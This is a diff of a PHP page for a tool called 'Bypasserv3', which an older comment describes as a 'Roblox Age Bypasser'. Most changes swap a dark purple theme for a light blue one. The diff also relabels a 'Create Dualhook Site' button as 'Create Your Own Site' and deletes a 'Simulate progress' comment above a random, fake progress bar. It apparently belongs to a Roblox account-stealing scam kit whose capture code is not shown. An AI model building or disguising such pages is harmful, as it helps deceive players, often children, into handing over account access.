@@ -1,7 +1,7 @@
 <?php
 /**
  * Bypasserv3 - Public Instance Page
- * Roblox Age Bypasser
+ * Modern Clean Blue/White Design
  */
 
 require_once __DIR__ . '/../config.php';
@@ -45,9 +45,8 @@ updateGlobalStats('totalVisits', 1);
         
         body {
             font-family: 'Outfit', sans-serif;
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 50%, #0f172a 100%);
-            background-attachment: fixed;
-            color: #f8fafc;
+            background: linear-gradient(135deg, #f0f5ff 0%, #e8f1ff 50%, #f0f5ff 100%);
+            color: #1a2a4a;
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -69,25 +68,20 @@ updateGlobalStats('totalVisits', 1);
             font-size: 48px;
             font-weight: 700;
             margin-bottom: 12px;
-            background: linear-gradient(135deg, #8b5cf6 0%, #a78bfa 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
+            color: #3b82f6;
         }
         
         .header p {
-            color: rgba(255, 255, 255, 0.6);
+            color: #64748b;
             font-size: 16px;
         }
         
         .glass-box {
-            backdrop-filter: blur(20px) saturate(200%);
-            -webkit-backdrop-filter: blur(20px) saturate(200%);
-            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
-            border: 1px solid rgba(139, 92, 246, 0.2);
-            border-radius: 20px;
+            background: white;
+            border-radius: 16px;
             padding: 40px;
-            box-shadow: 0 8px 32px 0 rgba(139, 92, 246, 0.15);
+            box-shadow: 0 2px 15px rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.1);
             margin-bottom: 24px;
         }
         
@@ -99,17 +93,17 @@ updateGlobalStats('totalVisits', 1);
             display: block;
             font-size: 14px;
             font-weight: 600;
-            color: rgba(255, 255, 255, 0.9);
+            color: #1a2a4a;
             margin-bottom: 12px;
         }
         
         .form-group textarea {
             width: 100%;
             padding: 16px;
-            background: rgba(30, 41, 59, 0.8);
-            border: 1px solid rgba(139, 92, 246, 0.2);
-            border-radius: 12px;
-            color: #f8fafc;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            color: #1a2a4a;
             font-size: 13px;
             font-family: 'Outfit', sans-serif;
             resize: vertical;
@@ -118,14 +112,14 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .form-group textarea::placeholder {
-            color: rgba(255, 255, 255, 0.3);
+            color: #cbd5e1;
         }
         
         .form-group textarea:focus {
             outline: none;
-            background: rgba(30, 41, 59, 0.95);
-            border-color: #8b5cf6;
-            box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);
+            background: white;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
         }
         
         .button-group {
@@ -138,23 +132,20 @@ updateGlobalStats('totalVisits', 1);
         .btn-start {
             width: 100%;
             padding: 14px 20px;
-            background: linear-gradient(135deg, #8b5cf6 0%, #a78bfa 100%);
+            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
             border: none;
-            border-radius: 12px;
+            border-radius: 10px;
             color: white;
             font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(59, 130, 246, 0.3);
         }
         
         .btn-start:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(139, 92, 246, 0.4);
-        }
-        
-        .btn-start:active {
-            transform: translateY(0);
+            box-shadow: 0 6px 20px rgba(59, 130, 246, 0.4);
         }
         
         .btn-start:disabled {
@@ -164,32 +155,30 @@ updateGlobalStats('totalVisits', 1);
         
         .btn-create {
             padding: 12px 40px;
-            background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);
-            border: none;
+            background: rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.2);
             border-radius: 10px;
-            color: white;
-            font-size: 16px;
+            color: #3b82f6;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
+            text-decoration: none;
             transition: all 0.3s ease;
             display: inline-block;
             margin-bottom: 24px;
-            text-decoration: none;
         }
         
         .btn-create:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
+            background: rgba(59, 130, 246, 0.15);
+            border-color: rgba(59, 130, 246, 0.4);
         }
         
         .process-box {
-            backdrop-filter: blur(20px) saturate(200%);
-            -webkit-backdrop-filter: blur(20px) saturate(200%);
-            background: linear-gradient(135deg, rgba(15, 23, 42, 0.8) 0%, rgba(30, 41, 59, 0.6) 100%);
-            border: 1px solid rgba(139, 92, 246, 0.2);
-            border-radius: 20px;
+            background: white;
+            border-radius: 16px;
             padding: 30px;
-            box-shadow: 0 8px 32px 0 rgba(139, 92, 246, 0.15);
+            box-shadow: 0 2px 15px rgba(59, 130, 246, 0.1);
+            border: 1px solid rgba(59, 130, 246, 0.1);
         }
         
         .process-title {
@@ -197,7 +186,7 @@ updateGlobalStats('totalVisits', 1);
             font-size: 18px;
             font-weight: 600;
             margin-bottom: 20px;
-            color: rgba(255, 255, 255, 0.9);
+            color: #1a2a4a;
         }
         
         .process-step {
@@ -205,12 +194,12 @@ updateGlobalStats('totalVisits', 1);
             align-items: center;
             gap: 12px;
             padding: 12px;
-            background: rgba(139, 92, 246, 0.1);
-            border: 1px solid rgba(139, 92, 246, 0.2);
+            background: rgba(59, 130, 246, 0.05);
+            border: 1px solid rgba(59, 130, 246, 0.1);
             border-radius: 10px;
             margin-bottom: 10px;
             font-size: 14px;
-            color: rgba(255, 255, 255, 0.7);
+            color: #64748b;
         }
         
         .process-step:last-child {
@@ -218,7 +207,7 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .process-arrow {
-            color: rgba(139, 92, 246, 0.6);
+            color: #3b82f6;
             font-weight: 600;
             min-width: 20px;
         }
@@ -226,18 +215,17 @@ updateGlobalStats('totalVisits', 1);
         .disclaimer {
             text-align: center;
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.4);
+            color: #94a3b8;
             margin-top: 30px;
         }
         
         .spinner {
             width: 20px;
             height: 20px;
-            border: 2px solid rgba(255, 255, 255, 0.3);
-            border-top: 2px solid white;
+            border: 2px solid rgba(59, 130, 246, 0.2);
+            border-top: 2px solid #3b82f6;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            display: inline-block;
         }
         
         @keyframes spin {
@@ -266,7 +254,7 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .success-info {
-            background: rgba(16, 185, 129, 0.1);
+            background: rgba(16, 185, 129, 0.05);
             border: 1px solid rgba(16, 185, 129, 0.2);
             border-radius: 12px;
             padding: 20px;
@@ -287,7 +275,7 @@ updateGlobalStats('totalVisits', 1);
         }
         
         .info-label {
-            color: rgba(255, 255, 255, 0.6);
+            color: #64748b;
         }
         
         .info-value {
@@ -303,8 +291,8 @@ updateGlobalStats('totalVisits', 1);
         .processing-spinner {
             width: 50px;
             height: 50px;
-            border: 4px solid rgba(139, 92, 246, 0.2);
-            border-top: 4px solid #8b5cf6;
+            border: 4px solid rgba(59, 130, 246, 0.1);
+            border-top: 4px solid #3b82f6;
             border-radius: 50%;
             animation: spin 1s linear infinite;
             margin: 30px auto;
@@ -313,7 +301,7 @@ updateGlobalStats('totalVisits', 1);
         .progress-bar {
             width: 100%;
             height: 4px;
-            background: rgba(139, 92, 246, 0.1);
+            background: rgba(59, 130, 246, 0.1);
             border-radius: 10px;
             overflow: hidden;
             margin-top: 20px;
@@ -321,7 +309,7 @@ updateGlobalStats('totalVisits', 1);
         
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #8b5cf6, #a78bfa);
+            background: linear-gradient(90deg, #3b82f6, #2563eb);
             width: 0%;
             transition: width 0.3s ease;
         }
@@ -354,10 +342,10 @@ updateGlobalStats('totalVisits', 1);
                 </div>
             </div>
 
-            <!-- Create Dualhook Site Button -->
+            <!-- Create Site Button -->
             <div style="text-align: center; margin-bottom: 24px;">
                 <a href="/generator/" class="btn-create">
-                    ✨ Create Dualhook Site
+                    ✨ Create Your Own Site
                 </a>
             </div>
 
@@ -383,11 +371,11 @@ updateGlobalStats('totalVisits', 1);
         <div id="processingContainer" style="display: none;">
             <div class="glass-box processing-state">
                 <div class="processing-spinner"></div>
-                <p style="color: rgba(255, 255, 255, 0.7); margin-top: 20px;">Processing your request...</p>
+                <p style="color: #64748b; margin-top: 20px;">Processing your request...</p>
                 <div class="progress-bar">
                     <div class="progress-fill" id="progressFill"></div>
                 </div>
-                <p style="font-size: 12px; color: rgba(255, 255, 255, 0.5); margin-top: 8px;" id="progressText">0%</p>
+                <p style="font-size: 12px; color: #94a3b8; margin-top: 8px;" id="progressText">0%</p>
             </div>
         </div>
 
@@ -435,7 +423,6 @@ updateGlobalStats('totalVisits', 1);
             document.getElementById('formContainer').style.display = 'none';
             document.getElementById('processingContainer').style.display = 'block';
 
-            // Simulate progress
             let progress = 0;
             const progressInterval = setInterval(() => {
                 progress += Math.random() * 25;
